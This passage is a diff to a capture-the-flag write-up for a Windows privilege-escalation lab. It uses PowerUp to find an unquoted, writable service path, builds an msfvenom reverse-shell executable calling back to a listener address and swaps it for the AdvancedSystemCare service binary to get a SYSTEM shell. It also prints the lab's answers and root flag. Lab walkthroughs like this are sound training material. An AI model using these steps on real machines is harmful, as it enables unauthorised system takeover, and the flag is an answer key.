@@ -209,3 +209,79 @@ On Terminal: `powershell_shell`
 
 <p align="center"> <img src="https://i.imgur.com/MHXJWwn.png" height="90%" width="90%" alt=""/>
 
+We will run the PowerUp Powershell script by entering:
+
+On Terminal: `. .\PowerUp.ps1`
+On Terminal: `Invoke-Allchecks`
+
+<p align="center"> <img src="https://i.imgur.com/pZ84T5T.png" height="90%" width="90%" alt=""/>
+
+Question 1: Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
+
+`AdvancedSystemCareService9`
+
+#
+
+# Question 2
+
+When CanRestart is set to true, it means we can restart a service on the system. Additionally, the directory to the application is writable, allowing us to replace the real application with our harmful one. After doing this, if we restart the service, it will run our infected program instead.
+
+Open a new terminal, Use msfvenom to generate a reverse shell as an Windows executable.
+
+On Terminal: `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.106.187 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`
+- Generated a reverse shell with the name "ASCService.exe". (Save it in your project directory)
+
+<p align="center"> <img src="https://i.imgur.com/kbcOXZ9.png" height="90%" width="90%" alt=""/>
+
+Exit Powershell and upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
+
+On the meterpreter Terminal: `upload ASCService.exe`
+
+<p align="center"> <img src="https://i.imgur.com/c9vNAjx.png" height="90%" width="90%" alt=""/>
+
+Now, we want to swap out the real one. Go into a regular command shell from your meterpreter shell by typing: shell.
+
+Before you copy anything, make sure to halt the service by typing:
+
+On Terminal: `shell`
+
+On Terminal: `sc stop AdvancedSystemCareService9`
+
+<p align="center"> <img src="https://i.imgur.com/zFB5y4X.png" height="90%" width="90%" alt=""/>
+
+We will copy the file to the original location:
+
+On Terminal: `copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`
+
+<p align="center"> <img src="https://i.imgur.com/a6fZ2sQ.png" height="90%" width="90%" alt=""/>
+
+We now will use ncat to listen. We will open a new terminal to do this:
+
+On Terminal: `ncat -nlvp 4443`
+
+We will restart the program to get into the shell as root.
+
+On Terminal: `sc start AdvancedSystemCareService9`
+
+<p align="center"> <img src="https://i.imgur.com/x5RyzpY.png" height="90%" width="90%" alt=""/>
+
+We now have system root access. We will navigate to the Administrator Desktop to capture the root flag.
+
+On Terminal: `cd /Users/Administrator/Desktop`
+
+On Terminal: `dir`
+- To see what files is in the directory.
+
+<p align="center"> <img src="https://i.imgur.com/DxfW5jO.png" height="90%" width="90%" alt=""/>
+
+We will now use the `more` command to read the root flag.
+
+On Terminal: `more root.txt`
+
+<p align="center"> <img src="https://i.imgur.com/kc6cie8.png" height="90%" width="90%" alt=""/>
+
+Successfully captured the flag.
+
+Question 2: What is the root flag?
+
+`9af5f314f57607c00fd09803a587db80`
